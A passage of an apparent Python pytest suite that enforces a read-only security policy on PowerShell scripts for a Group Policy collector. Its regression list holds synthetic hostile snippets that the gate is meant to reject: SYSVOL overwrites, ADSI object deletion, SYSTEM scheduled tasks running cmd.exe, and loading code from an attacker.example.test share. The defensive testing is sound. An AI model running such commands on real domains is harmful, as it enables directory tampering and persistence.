                f"{script}:{binding['line']}: ${binding['name']} reassigned to an undocumented "
                f"value {rhs!r} (a confined write/exec root cannot be rebound)"
            )
        else:  # param default or foreach source: no UNC/provider/.. literal
            assert not _UNC_OR_DOTDOT.search(rhs) and not _PROVIDER.search(rhs), (
                f"{script}:{binding['line']}: ${binding['name']} bound via {binding['kind']} to an "
                f"unsafe path {rhs!r}"
            )


def check_task_action(script: str, entry: dict[str, Any]) -> None:
    if script != _TASK_ACTION_SCRIPT:
        for command in entry["commands"]:
            assert command["name"] not in TASK_ACTION, (
                f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
            )
        return
    for command in entry["commands"]:
        pins = TASK_ACTION.get(command["name"] or "")
        if pins is None:
            continue
        bound = command["bound"]
        for param, expected in pins.items():
            actual = bound.get(param)
            assert isinstance(actual, str) and _norm(actual) == _norm(expected), (
                f"{script}:{command['line']}: {command['name']} -{param} is {actual!r}, "
                f"must be {expected!r}"
            )


def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
    policy = POLICIES[script]
    entry = inv[script]
    assert entry["parse_errors"] == []
    local = set(entry["functions"])
    for source in policy.dot_sources:
        local |= set(inv[source]["functions"])
    check_commands(script, entry, local)
    check_dotnet(script, entry)
    check_types(script, entry)
    check_instance_receivers(script, entry)
    check_usings(script, entry)
    check_redirections(script, entry)
    check_new_object_and_add_type(script, entry)
    check_writes(script, entry)
    check_pinned_bindings(script, entry)
    check_task_action(script, entry)


def test_every_script_is_classified() -> None:
    on_disk = {p.name for p in _SCRIPTS.glob("*.ps1")}
    classified = set(POLICIES) | set(OUT_OF_SCOPE)
    assert on_disk == classified, (
        "Every scripts/*.ps1 must be in POLICIES or OUT_OF_SCOPE: "
        f"unclassified {sorted(on_disk - classified)}, missing {sorted(classified - on_disk)}"
    )


def test_policy_tables_cover_every_script() -> None:
    for table_name, table in (
        ("WRITE_ROOTS", WRITE_ROOTS),
        ("PINNED_VARS", PINNED_VARS),
        ("INSTANCE_RECEIVERS", INSTANCE_RECEIVERS),
    ):
        assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_parses_without_errors(inventory: dict[str, dict[str, Any]], script: str) -> None:
    assert inventory[script]["parse_errors"] == []


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_commands_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    policy = POLICIES[script]
    local = set(inventory[script]["functions"])
    for source in policy.dot_sources:
        local |= set(inventory[source]["functions"])
    check_commands(script, inventory[script], local)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_dotnet_calls_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_dotnet(script, inventory[script])
    check_types(script, inventory[script])
    check_instance_receivers(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_using_or_disallowed_redirection(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_usings(script, inventory[script])
    check_redirections(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_new_object_and_add_type(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_new_object_and_add_type(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_writes_stay_under_declared_roots(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_writes(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_pinned_variables_are_not_rebound(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_pinned_bindings(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_scheduled_task_arguments_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_task_action(script, inventory[script])


def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
    """Every AD/GroupPolicy noun-verb in an allowlist is a Get-*, and only the
    registration script may name the scheduled-task cmdlets."""
    task_cmdlets = {
        "New-ScheduledTask",
        "New-ScheduledTaskAction",
        "New-ScheduledTaskPrincipal",
        "New-ScheduledTaskSettingsSet",
        "New-ScheduledTaskTrigger",
        "Register-ScheduledTask",
        "Unregister-ScheduledTask",
    }
    for script, policy in POLICIES.items():
        directory = {c for c in policy.commands if re.match(r"^\w+-(AD|GP)", c)}
        assert all(c.startswith("Get-") for c in directory), (script, sorted(directory))
        tasks = policy.commands & task_cmdlets
        if script != _TASK_ACTION_SCRIPT:
            assert not tasks, f"{script} must not touch Task Scheduler: {sorted(tasks)}"


# ---------------------------------------------------------------------------
# Regression suite: every reviewer probe (both lineages) must be flagged. Each
# probe appends/prepends one malicious edit to a copy of a real script; the
# full gate must raise for that script. A clean copy must pass.
# ---------------------------------------------------------------------------

# (id, base script, "append"|"prepend", snippet). Snippets are synthetic and
# use example.test / LABDOMAIN placeholders only.
_REGRESSIONS: list[tuple[str, str, str, str]] = [
    # --- Sol probes ---
    (
        "sol_root_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "sol_registry_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = 'HKLM:\\Software\\GpoLensGateBypass'\n"
        "New-Item -Path $OutputRoot -Force | Out-Null\n",
    ),
    (
        "sol_set_itemtype",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -ItemType SymbolicLink "
        "-Value '\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Force | Out-Null\n",
    ),
    (
        "sol_redirection",
        "Export-GpoEstate.ps1",
        "append",
        "'owned' > '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_redirection_stream",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'owned' 6> '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_get_gporeport_path",
        "Export-GpoEstate.ps1",
        "append",
        "Get-GPOReport -All -ReportType Xml "
        "-Path '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "sol_instance_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$unownedFile = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$unownedFile.Delete()\n",
    ),
    (
        "sol_adsi_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$domain = [ADSI]'WinNT://LABDOMAIN,domain'\n$domain.Delete('user', 'victim')\n",
    ),
    ("sol_using_module", "Export-GpoEstate.ps1", "prepend", "using module ./GateEvil.psm1\n"),
    (
        "sol_collector_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "$CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "sol_task_abuse",
        "Register-GpoLensCollection.ps1",
        "append",
        "$evilAction = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$evilTask = New-ScheduledTask -Action $evilAction -Principal $principal\n"
        "Register-ScheduledTask -TaskName 'GpoLensGateBypass' -InputObject $evilTask -Force\n",
    ),
    # --- DeepSeek probes ---
    (
        "ds_writeroot_var",
        "Export-GpoEstate.ps1",
        "append",
        "$dest = Join-Path 'C:\\Windows\\System32' 'evil.dll'\n"
        "Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue\n",
    ),
    (
        "ds_writeroot_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$LogPath = 'C:\\Windows\\System32\\evil.log'\n"
        "[IO.File]::AppendAllText($LogPath, 'owned', [Text.UTF8Encoding]::new($false))\n",
    ),
    (
        "ds_adsi_copyto_marker",
        "GpoLensCollectionMarker.ps1",
        "append",
        "([ADSI]'LDAP://CN=victim,OU=x,DC=example,DC=test')"
        ".CopyTo('LDAP://OU=evil,DC=example,DC=test')\n",
    ),
    (
        "ds_register_args",
        "Register-GpoLensCollection.ps1",
        "append",
        "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n"
        "$t = New-ScheduledTask -Action $a -Principal $p\n"
        "Register-ScheduledTask -TaskName 'NotGpoLens' -InputObject $t -Force\n",
    ),
    (
        "ds_using_assembly",
        "Export-GpoEstate.ps1",
        "prepend",
        "using assembly System.DirectoryServices\n",
    ),
    # --- Negative controls from both lineages (must already be rejected) ---
    (
        "neg_set_adobject",
        "Export-GpoEstate.ps1",
        "append",
        "Set-ADObject -Identity 'x' -Replace @{description='y'}\n",
    ),
    (
        "neg_adsi_commit",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$e.CommitChanges()\n",
    ),
    (
        "neg_dynamic_member",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$m = 'CommitChanges'\n$e.$m()\n",
    ),
    ("neg_com", "Export-GpoEstate.ps1", "append", "New-Object -ComObject 'WScript.Shell'\n"),
    (
        "neg_namespace_de",
        "Export-GpoEstate.ps1",
        "prepend",
        "using namespace System.DirectoryServices\n",
    ),
    (
        "neg_splat_write",
        "Export-GpoEstate.ps1",
        "append",
        "$w = @{ LiteralPath = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'; Value = 'owned' }\n"
        "Set-Content @w\n",
    ),
    (
        "neg_addtype_inline",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -TypeDefinition 'public static class P { public static void R() {} }'\n",
    ),
    (
        "neg_import_module_unc",
        "Export-GpoEstate.ps1",
        "append",
        "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
    ),
]


def _modified_inventory(
    exe: str,
    base: str,
    position: str,
    snippet: str,
    dest: Path,
    extra_files: dict[str, str] | None = None,
) -> dict[str, dict[str, Any]]:
    copy = dest / "scripts"
    copy.mkdir(parents=True, exist_ok=True)
    for name in POLICIES:
        text = (_SCRIPTS / name).read_text(encoding="utf-8")
        if name == base:
            text = snippet + text if position == "prepend" else text + "\n" + snippet
        (copy / name).write_text(text, encoding="utf-8")
    for extra_name, extra_text in (extra_files or {}).items():
        (copy / extra_name).write_text(extra_text, encoding="utf-8")
    return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])


@pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
def test_reviewer_probes_are_flagged(tmp_path: Path, probe: tuple[str, str, str, str]) -> None:
    probe_id, base, position, snippet = probe
    exe = _pwsh()
    extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
    inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
    with pytest.raises(AssertionError):
        run_all_checks(base, inv)


def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
    for script in POLICIES:
        run_all_checks(script, inventory)
